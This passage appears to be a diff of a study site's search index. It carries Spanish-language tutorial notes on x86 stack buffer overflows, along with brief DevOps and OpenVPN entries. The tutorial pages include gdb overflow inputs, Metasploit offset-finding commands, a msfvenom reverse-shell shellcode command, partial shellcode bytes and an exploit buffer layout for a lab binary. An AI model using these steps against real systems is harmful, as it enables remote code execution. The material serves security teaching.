+    "text": "La arquitectura Von-Neumann fue desarrollada por John von Neumann y consiste en cuatro unidades funcionales.\n\n\n\n\n\nUnidad\nFunción\n\n\n\n\nMemory\nAlmacenamiento de datos e instrucciones\n\n\nControl Unit (CU)\nControla operaciones del procesador\n\n\nALU\nOperaciones aritméticas y lógicas\n\n\nI/O Unit\nEntrada y salida de datos\n\n\n\n\n\n\n\n\n\n\n\nTipo\nDescripción\n\n\n\n\nCache\nIntegrada en CPU, buffer de alta velocidad\n\n\nRAM\nAlmacenamiento principal, acceso aleatorio por dirección\n\n\n\n\nPérdida de datos al apagar\nAcceso directo por direcciones de memoria\nCache alimenta datos al procesador\n\n\n\n\n\n\n\nTipo\nDescripción\n\n\n\n\nHDD/SSD\nAlmacenamiento masivo permanente\n\n\nFlash Drives\nAlmacenamiento portátil\n\n\nCD/DVD-ROM\nAlmacenamiento óptico\n\n\n\n\nMayor capacidad\nPersistencia sin energía\nAcceso vía interfaces I/O\nMás lento que memoria primaria\n\n\n\n\n\nResponsabilidades:\n\nLeer datos de RAM\nGuardar datos en RAM\nDecodificar y ejecutar instrucciones\nProcesar entradas/salidas\nControl de interrupciones\nMonitoreo del sistema\n\n\n\n\n\n\n\n\n\nTipo\nDescripción\nUso\n\n\n\n\nCISC\nComplex Instruction Set Computing\nx86/i386\n\n\nRISC\nReduced Instruction Set Computing\nARM, smartphones\n\n\nVLIW\nVery Long Instruction Word\nEspecializado\n\n\nEPIC\nExplicitly Parallel Instruction Computing\nItanium\n\n\n\n\n\n\n\n\n\nAspecto\nCISC\nRISC\n\n\n\n\nInstrucciones\nComplejas, muchas\nSimples, pocas\n\n\nCiclos por instrucción\nVariable\n1 ciclo\n\n\nTamaño instrucción\nVariable (8-bit mode)\nFijo (32/64-bit)\n\n\nFrecuencia\nMenor\nMayor\n\n\nEjemplo\nx86\nARM\n\n\n\n\n\n\n\n\n\n\nPaso\nInstrucción\nDescripción\n\n\n\n\n1\nFETCH\nCargar instrucción de RAM a IR\n\n\n2\nDECODE\nDecodificar instrucción\n\n\n3\nFETCH OPERANDS\nCargar datos necesarios\n\n\n4\nEXECUTE\nEjecutar operación\n\n\n5\nUPDATE IP\nActualizar puntero de instrucción\n\n\n\n\n\n\n\n\n\nArquitectura\nBits\nFabricante\n\n\n\n\nx86/i386\n32-bit\nAMD, Intel\n\n\nx86-64/amd64\n64-bit\nAMD, Intel\n\n\nARM\n32/64-bit\nAcorn (ARM Holdings)"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html#componentes-principales",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html#componentes-principales",
+    "title": "CPU Architecture",
+    "section": "",
+    "text": "Unidad\nFunción\n\n\n\n\nMemory\nAlmacenamiento de datos e instrucciones\n\n\nControl Unit (CU)\nControla operaciones del procesador\n\n\nALU\nOperaciones aritméticas y lógicas\n\n\nI/O Unit\nEntrada y salida de datos"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html#memoria",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html#memoria",
+    "title": "CPU Architecture",
+    "section": "",
+    "text": "Tipo\nDescripción\n\n\n\n\nCache\nIntegrada en CPU, buffer de alta velocidad\n\n\nRAM\nAlmacenamiento principal, acceso aleatorio por dirección\n\n\n\n\nPérdida de datos al apagar\nAcceso directo por direcciones de memoria\nCache alimenta datos al procesador\n\n\n\n\n\n\n\nTipo\nDescripción\n\n\n\n\nHDD/SSD\nAlmacenamiento masivo permanente\n\n\nFlash Drives\nAlmacenamiento portátil\n\n\nCD/DVD-ROM\nAlmacenamiento óptico\n\n\n\n\nMayor capacidad\nPersistencia sin energía\nAcceso vía interfaces I/O\nMás lento que memoria primaria"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html#unidad-de-control-cu",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html#unidad-de-control-cu",
+    "title": "CPU Architecture",
+    "section": "",
+    "text": "Responsabilidades:\n\nLeer datos de RAM\nGuardar datos en RAM\nDecodificar y ejecutar instrucciones\nProcesar entradas/salidas\nControl de interrupciones\nMonitoreo del sistema"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html#instruction-set-architecture-isa",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html#instruction-set-architecture-isa",
+    "title": "CPU Architecture",
+    "section": "",
+    "text": "Tipo\nDescripción\nUso\n\n\n\n\nCISC\nComplex Instruction Set Computing\nx86/i386\n\n\nRISC\nReduced Instruction Set Computing\nARM, smartphones\n\n\nVLIW\nVery Long Instruction Word\nEspecializado\n\n\nEPIC\nExplicitly Parallel Instruction Computing\nItanium\n\n\n\n\n\n\n\n\n\nAspecto\nCISC\nRISC\n\n\n\n\nInstrucciones\nComplejas, muchas\nSimples, pocas\n\n\nCiclos por instrucción\nVariable\n1 ciclo\n\n\nTamaño instrucción\nVariable (8-bit mode)\nFijo (32/64-bit)\n\n\nFrecuencia\nMenor\nMayor\n\n\nEjemplo\nx86\nARM"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html#instruction-cycle",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html#instruction-cycle",
+    "title": "CPU Architecture",
+    "section": "",
+    "text": "Paso\nInstrucción\nDescripción\n\n\n\n\n1\nFETCH\nCargar instrucción de RAM a IR\n\n\n2\nDECODE\nDecodificar instrucción\n\n\n3\nFETCH OPERANDS\nCargar datos necesarios\n\n\n4\nEXECUTE\nEjecutar operación\n\n\n5\nUPDATE IP\nActualizar puntero de instrucción"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/03-cpu-architecture.html#arquitecturas-cpu-comunes",
+    "href": "security/buffer-overflow-x86/03-cpu-architecture.html#arquitecturas-cpu-comunes",
+    "title": "CPU Architecture",
+    "section": "",
+    "text": "Arquitectura\nBits\nFabricante\n\n\n\n\nx86/i386\n32-bit\nAMD, Intel\n\n\nx86-64/amd64\n64-bit\nAMD, Intel\n\n\nARM\n32/64-bit\nAcorn (ARM Holdings)"
   },
   {
     "objectID": "security/openvpn-setup.html",
@@ -3106,6 +3379,454 @@
     "title": "OpenVPN Setup Guide",
     "section": "",
     "text": "GUÍA COMPLETADA 🎉\n\n📅 Fecha: 2026-02-20\n🎯 Sistemas: Linux, macOS, Windows\n🛠️ Herramientas: OpenVPN CLI, OpenVPN Connect\n\n\n← Back to Security"
+  },
+  {
+    "objectID": "devops-practices/index.html",
+    "href": "devops-practices/index.html",
+    "title": "DevOps Practices",
+    "section": "",
+    "text": "This section covers DevOps tools and methodologies - configuration management, automation, and infrastructure practices.\n\n\n\n\n\nAnsible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services\n\n\n\n\n\n\nAnsible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+  },
+  {
+    "objectID": "devops-practices/index.html#chapters",
+    "href": "devops-practices/index.html#chapters",
+    "title": "DevOps Practices",
+    "section": "",
+    "text": "Ansible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services"
+  },
+  {
+    "objectID": "devops-practices/index.html#skills-developed",
+    "href": "devops-practices/index.html#skills-developed",
+    "title": "DevOps Practices",
+    "section": "",
+    "text": "Ansible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+  },
+  {
+    "objectID": "devops-practices.html",
+    "href": "devops-practices.html",
+    "title": "DevOps Practices",
+    "section": "",
+    "text": "This section covers DevOps tools and methodologies - configuration management, automation, and infrastructure practices.\n\n\n\n\n\nAnsible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services\n\n\n\n\n\n\nAnsible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+  },
+  {
+    "objectID": "devops-practices.html#chapters",
+    "href": "devops-practices.html#chapters",
+    "title": "DevOps Practices",
+    "section": "",
+    "text": "Ansible Basics - Getting started with Ansible\n\n\n\n\n\nCron Job Deployment - Scheduled task automation\n\n\n\n\n\nMariaDB Troubleshooting - Fixing database services"
+  },
+  {
+    "objectID": "devops-practices.html#skills-developed",
+    "href": "devops-practices.html#skills-developed",
+    "title": "DevOps Practices",
+    "section": "",
+    "text": "Ansible configuration management\nCron job automation\nDatabase service management\nTroubleshooting production issues\n\n\nUse the sidebar to navigate to specific chapters."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html",
+    "href": "security/buffer-overflow-x86/01-introduction.html",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Los buffer overflows son vulnerabilidades comunes en aplicaciones de software que pueden ser explotadas para lograr ejecución remota de código (RCE) o realizar ataques de Denegación de Servicio (DoS).\n\n\nEstas vulnerabilidades son causadas por:\n\nCódigo inseguro que no valida límites de memoria\nUso de lenguajes sin protección automática (C/C++)\nFalta de verificación de tamaño de entrada\nProgramación descuidada en gestión de buffers\n\n\n\n\nUn buffer overflow puede:\n\nHacer que el programa falle (crash)\nCorromper datos\nSobrescribir estructuras de datos\nModificar la dirección de retorno\nEjecutar código arbitrario\n\n\n\n\n\n\nHeap-Based Buffer Overflow en sudo - demuestra que estas vulnerabilidades siguen siendo relevantes.\n\n\n\nHP iLO Management - Buffer overflow en HTTP Header con solo 29 caracteres, causando bypass de autenticación.\n\n\n\n\n\n\n\nLenguaje\nRiesgo\nRazón\n\n\n\n\nC\nAlto\nSin verificación automática de límites\n\n\nC++\nAlto\nSimilar a C, énfasis en rendimiento\n\n\nJava\nBajo\nGarbage collection, gestión automática\n\n\nPython\nBajo\nAbstracción alta, gestión automática\n\n\n\n\n\n\nLos buffer overflows son posibles principalmente en sistemas basados en la arquitectura Von-Neumann, donde datos e instrucciones comparten el mismo espacio de memoria.\n\n\n\n\nCompiladores modernos incluyen protecciones\nDEP (Data Execution Prevention)\nASLR (Address Space Layout Randomization)\nStack Canaries\nSin embargo, C/C++ siguen siendo predominantes en:\n\nSoftware embebido\nIoT (Internet of Things)\nSistemas operativos\nControladores"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html#causas-principales",
+    "href": "security/buffer-overflow-x86/01-introduction.html#causas-principales",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Estas vulnerabilidades son causadas por:\n\nCódigo inseguro que no valida límites de memoria\nUso de lenguajes sin protección automática (C/C++)\nFalta de verificación de tamaño de entrada\nProgramación descuidada en gestión de buffers"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html#impacto",
+    "href": "security/buffer-overflow-x86/01-introduction.html#impacto",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Un buffer overflow puede:\n\nHacer que el programa falle (crash)\nCorromper datos\nSobrescribir estructuras de datos\nModificar la dirección de retorno\nEjecutar código arbitrario"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html#ejemplos-históricos",
+    "href": "security/buffer-overflow-x86/01-introduction.html#ejemplos-históricos",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Heap-Based Buffer Overflow en sudo - demuestra que estas vulnerabilidades siguen siendo relevantes.\n\n\n\nHP iLO Management - Buffer overflow en HTTP Header con solo 29 caracteres, causando bypass de autenticación."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html#lenguajes-vulnerables",
+    "href": "security/buffer-overflow-x86/01-introduction.html#lenguajes-vulnerables",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Lenguaje\nRiesgo\nRazón\n\n\n\n\nC\nAlto\nSin verificación automática de límites\n\n\nC++\nAlto\nSimilar a C, énfasis en rendimiento\n\n\nJava\nBajo\nGarbage collection, gestión automática\n\n\nPython\nBajo\nAbstracción alta, gestión automática"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html#arquitectura-von-neumann",
+    "href": "security/buffer-overflow-x86/01-introduction.html#arquitectura-von-neumann",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Los buffer overflows son posibles principalmente en sistemas basados en la arquitectura Von-Neumann, donde datos e instrucciones comparten el mismo espacio de memoria."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/01-introduction.html#tendencias-actuales",
+    "href": "security/buffer-overflow-x86/01-introduction.html#tendencias-actuales",
+    "title": "Buffer Overflows Overview",
+    "section": "",
+    "text": "Compiladores modernos incluyen protecciones\nDEP (Data Execution Prevention)\nASLR (Address Space Layout Randomization)\nStack Canaries\nSin embargo, C/C++ siguen siendo predominantes en:\n\nSoftware embebido\nIoT (Internet of Things)\nSistemas operativos\nControladores"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "El objetivo principal es obtener control del Instruction Pointer (EIP) para dirigir el flujo de ejecución.\n\n\ngdb -q ./bow32\n(gdb) run $(python -c \"print '\\x55' * 1200\")\nResultado:\nProgram received signal SIGSEGV, Segmentation fault.\n0x55555555 in ?? ()\n\n\n\n(gdb) info registers eip\neip            0x55555555   0x55555555\nEIP contiene 0x55555555 = nuestros bytes \\x55 → Tenemos control.\n\n\n\nUsar Metasploit para crear patrón único:\n# Crear patrón de 1200 bytes\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txt\n(gdb) run $(cat pattern.txt)\nProgram received signal SIGSEGV, Segmentation fault.\n0x69423569 in ?? ()\nCalcular offset:\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569\n[*] Exact match at offset 1036\n\n\n\nEsto significa: - 1036 bytes de padding para llegar al EIP - 4 bytes adicionales sobrescriben el EIP\n\n\n\n(gdb) run $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\nEIP = 0x66666666 → Offset confirmado.\n\n\n\n\n\n\nComponente\nTamaño\nContenido\n\n\n\n\nPadding\n1036 bytes\n\\x55\n\n\nEBP\n4 bytes\nSobrescrito\n\n\nEIP\n4 bytes\nDirección a controlar\n\n\n\n\n\n\nBuffer: [1036 bytes padding][4 bytes EBP][4 bytes EIP]\n                             ↑            ↑\n                          Offset       Control EIP\n\n\n\n\n\n\nComando\nPropósito\n\n\n\n\npattern_create.rb -l N\nCrear patrón único\n\n\npattern_offset.rb -q ADDR\nCalcular offset\n\n\ninfo registers eip\nVer EIP\n\n\nrun $(python -c \"...\")\nEjecutar con payload"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#paso-1-identificar-el-crash",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#paso-1-identificar-el-crash",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "gdb -q ./bow32\n(gdb) run $(python -c \"print '\\x55' * 1200\")\nResultado:\nProgram received signal SIGSEGV, Segmentation fault.\n0x55555555 in ?? ()"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#paso-2-verificar-control-de-eip",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#paso-2-verificar-control-de-eip",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "(gdb) info registers eip\neip            0x55555555   0x55555555\nEIP contiene 0x55555555 = nuestros bytes \\x55 → Tenemos control."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#paso-3-determinar-el-offset",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#paso-3-determinar-el-offset",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "Usar Metasploit para crear patrón único:\n# Crear patrón de 1200 bytes\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txt\n(gdb) run $(cat pattern.txt)\nProgram received signal SIGSEGV, Segmentation fault.\n0x69423569 in ?? ()\nCalcular offset:\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569\n[*] Exact match at offset 1036"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#offset-1036-bytes",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#offset-1036-bytes",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "Esto significa: - 1036 bytes de padding para llegar al EIP - 4 bytes adicionales sobrescriben el EIP"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#paso-4-verificar-el-offset",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#paso-4-verificar-el-offset",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "(gdb) run $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\nEIP = 0x66666666 → Offset confirmado."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#estructura-del-buffer",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#estructura-del-buffer",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "Componente\nTamaño\nContenido\n\n\n\n\nPadding\n1036 bytes\n\\x55\n\n\nEBP\n4 bytes\nSobrescrito\n\n\nEIP\n4 bytes\nDirección a controlar"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#resumen-visual",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#resumen-visual",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "Buffer: [1036 bytes padding][4 bytes EBP][4 bytes EIP]\n                             ↑            ↑\n                          Offset       Control EIP"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/06-take-control-eip.html#comandos-clave",
+    "href": "security/buffer-overflow-x86/06-take-control-eip.html#comandos-clave",
+    "title": "Take Control of EIP",
+    "section": "",
+    "text": "Comando\nPropósito\n\n\n\n\npattern_create.rb -l N\nCrear patrón único\n\n\npattern_offset.rb -q ADDR\nCalcular offset\n\n\ninfo registers eip\nVer EIP\n\n\nrun $(python -c \"...\")\nEjecutar con payload"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "Una vez identificados los bad characters, podemos generar shellcode válido usando msfvenom.\n\n\n\n\n\nComponente\nValor\n\n\n\n\nArchitecture\nx86 (32-bit)\n\n\nPlatform\nLinux\n\n\nBad Characters\n\\x00\\x09\\x0a\\x20\n\n\nPayload\nlinux/x86/shell_reverse_tcp\n\n\n\n\n\n\nmsfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=127.0.0.1 \\\n  LPORT=31337 \\\n  --format c \\\n  --arch x86 \\\n  --platform linux \\\n  --bad-chars \"\\x00\\x09\\x0a\\x20\" \\\n  --out shellcode\nResultado:\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 95 (iteration=0)\nPayload size: 95 bytes\n\n\n\nunsigned char buf[] = \n\"\\xda\\xca\\xba\\xe4\\x11\\xd4\\x5d\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\"\n\"\\x12\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x24\\x15\\x36\\xa8\\x95\\xcd\\x41\"\n\"\\xb0\\x86\\xb2\\xfe\\x5d\\x2a\\xbc\\xe0\\x12\\x4c\\x73\\x62\\xc1\\xc9\\x3b\"\n\n\n\nTotal = 1040 bytes\n- NOPs:      124 bytes\n- Shellcode:  95 bytes  \n- EIP:         4 bytes\n──────────────────────\nBuffer:      817 bytes\n\n\n\n\n\n\nComponente\nTamaño\nContenido\n\n\n\n\nBuffer\n817 bytes\n\\x55 * 817\n\n\nNOPs\n124 bytes\n\\x90 * 124\n\n\nShellcode\n95 bytes\nPayload codificado\n\n\nEIP\n4 bytes\nDirección a sobrescribir\n\n\n\n\n\n\n(gdb) run $(python -c 'print \"\\x55\" * 817 + \"\\x90\" * 124 + \"&lt;shellcode&gt;\" + \"\\x66\" * 4')\n(gdb) x/2000xb $esp+550\n\n\n\nEl tamaño total del stack se puede ver con:\n(gdb) info proc mappings\nStart Addr   End Addr       Size\n0xfffdd000 0xffffe000    0x21000  [stack]\nStack Size = 0x21000\n\n\n\n\n\n\nEncoder\nUso\n\n\n\n\nx86/shikata_ga_nai\nMás común, evade bad chars\n\n\nx86/alpha_mixed\nSolo caracteres alfanuméricos\n\n\nx86/countdown\nAlternativa para bad chars"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#componentes-a-considerar",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#componentes-a-considerar",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "Componente\nValor\n\n\n\n\nArchitecture\nx86 (32-bit)\n\n\nPlatform\nLinux\n\n\nBad Characters\n\\x00\\x09\\x0a\\x20\n\n\nPayload\nlinux/x86/shell_reverse_tcp"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#generar-shellcode-con-msfvenom",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#generar-shellcode-con-msfvenom",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "msfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=127.0.0.1 \\\n  LPORT=31337 \\\n  --format c \\\n  --arch x86 \\\n  --platform linux \\\n  --bad-chars \"\\x00\\x09\\x0a\\x20\" \\\n  --out shellcode\nResultado:\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 95 (iteration=0)\nPayload size: 95 bytes"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#shellcode-generado",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#shellcode-generado",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "unsigned char buf[] = \n\"\\xda\\xca\\xba\\xe4\\x11\\xd4\\x5d\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\"\n\"\\x12\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x24\\x15\\x36\\xa8\\x95\\xcd\\x41\"\n\"\\xb0\\x86\\xb2\\xfe\\x5d\\x2a\\xbc\\xe0\\x12\\x4c\\x73\\x62\\xc1\\xc9\\x3b\""
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#ajuste-del-buffer",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#ajuste-del-buffer",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "Total = 1040 bytes\n- NOPs:      124 bytes\n- Shellcode:  95 bytes  \n- EIP:         4 bytes\n──────────────────────\nBuffer:      817 bytes"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#estructura-final-del-exploit",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#estructura-final-del-exploit",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "Componente\nTamaño\nContenido\n\n\n\n\nBuffer\n817 bytes\n\\x55 * 817\n\n\nNOPs\n124 bytes\n\\x90 * 124\n\n\nShellcode\n95 bytes\nPayload codificado\n\n\nEIP\n4 bytes\nDirección a sobrescribir"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#verificar-en-gdb",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#verificar-en-gdb",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "(gdb) run $(python -c 'print \"\\x55\" * 817 + \"\\x90\" * 124 + \"&lt;shellcode&gt;\" + \"\\x66\" * 4')\n(gdb) x/2000xb $esp+550"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#stack-size",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#stack-size",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "El tamaño total del stack se puede ver con:\n(gdb) info proc mappings\nStart Addr   End Addr       Size\n0xfffdd000 0xffffe000    0x21000  [stack]\nStack Size = 0x21000"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/09-generating-shellcode.html#encoders-comunes",
+    "href": "security/buffer-overflow-x86/09-generating-shellcode.html#encoders-comunes",
+    "title": "Generating Shellcode",
+    "section": "",
+    "text": "Encoder\nUso\n\n\n\n\nx86/shikata_ga_nai\nMás común, evade bad chars\n\n\nx86/alpha_mixed\nSolo caracteres alfanuméricos\n\n\nx86/countdown\nAlternativa para bad chars"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/02-exploit-development.html",
+    "href": "security/buffer-overflow-x86/02-exploit-development.html",
+    "title": "Exploit Development Introduction",
+    "section": "",
+    "text": "El desarrollo de exploits ocurre en la Fase de Explotación después de identificar software y versiones específicas.\n\n\nUn exploit es código que causa que un servicio realice una operación deseada abusando de una vulnerabilidad encontrada. Sirve como proof-of-concept (POC) en reportes.\n\n\n\n\n\n\n\n\nTipo\nDescripción\n\n\n\n\n0-Day\nVulnerabilidad nueva, no pública, sin parche\n\n\nN-Day\nVulnerabilidad conocida, días desde publicación\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTipo\nDescripción\nEjemplo\n\n\n\n\nLocal\nEjecutado localmente, requiere acceso previo\nPDF malicioso, macro Word/Excel\n\n\nRemote\nEjecutado sobre la red\nBuffer overflow en servicio de red\n\n\nDoS\nCausa denegación de servicio\nCrash de aplicación o sistema\n\n\nWebApp\nExplota vulnerabilidades web\nSQL Injection, Command Injection\n\n\n\n\n\n\n\n\nIdentificar vulnerabilidad\nAnalizar causa raíz\nDesarrollar exploit\nProbar en entorno controlado\nDocumentar como POC\n\n\n\n\n\n\n\nLenguaje\nUso Común\n\n\n\n\nPython\nMás popular, fácil de escribir y entender\n\n\nC\nExploits de bajo nivel\n\n\nRuby\nFramework Metasploit\n\n\nPerl\nScripts legacy\n\n\n\n\n\n\n\nLos exploits suelen funcionar solo para versiones específicas\nRequiere reconstruir el entorno objetivo\nGeneralmente solo un intento si el programa tiene privilegios elevados\nDocumentación detallada es crucial"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/02-exploit-development.html#qué-es-un-exploit",
+    "href": "security/buffer-overflow-x86/02-exploit-development.html#qué-es-un-exploit",
+    "title": "Exploit Development Introduction",
+    "section": "",
+    "text": "Un exploit es código que causa que un servicio realice una operación deseada abusando de una vulnerabilidad encontrada. Sirve como proof-of-concept (POC) en reportes."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/02-exploit-development.html#tipos-de-exploits",
+    "href": "security/buffer-overflow-x86/02-exploit-development.html#tipos-de-exploits",
+    "title": "Exploit Development Introduction",
+    "section": "",
+    "text": "Tipo\nDescripción\n\n\n\n\n0-Day\nVulnerabilidad nueva, no pública, sin parche\n\n\nN-Day\nVulnerabilidad conocida, días desde publicación\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTipo\nDescripción\nEjemplo\n\n\n\n\nLocal\nEjecutado localmente, requiere acceso previo\nPDF malicioso, macro Word/Excel\n\n\nRemote\nEjecutado sobre la red\nBuffer overflow en servicio de red\n\n\nDoS\nCausa denegación de servicio\nCrash de aplicación o sistema\n\n\nWebApp\nExplota vulnerabilidades web\nSQL Injection, Command Injection"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/02-exploit-development.html#flujo-de-desarrollo",
+    "href": "security/buffer-overflow-x86/02-exploit-development.html#flujo-de-desarrollo",
+    "title": "Exploit Development Introduction",
+    "section": "",
+    "text": "Identificar vulnerabilidad\nAnalizar causa raíz\nDesarrollar exploit\nProbar en entorno controlado\nDocumentar como POC"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/02-exploit-development.html#lenguajes-para-exploits",
+    "href": "security/buffer-overflow-x86/02-exploit-development.html#lenguajes-para-exploits",
+    "title": "Exploit Development Introduction",
+    "section": "",
+    "text": "Lenguaje\nUso Común\n\n\n\n\nPython\nMás popular, fácil de escribir y entender\n\n\nC\nExploits de bajo nivel\n\n\nRuby\nFramework Metasploit\n\n\nPerl\nScripts legacy"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/02-exploit-development.html#consideraciones-importantes",
+    "href": "security/buffer-overflow-x86/02-exploit-development.html#consideraciones-importantes",
+    "title": "Exploit Development Introduction",
+    "section": "",
+    "text": "Los exploits suelen funcionar solo para versiones específicas\nRequiere reconstruir el entorno objetivo\nGeneralmente solo un intento si el programa tiene privilegios elevados\nDocumentación detallada es crucial"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
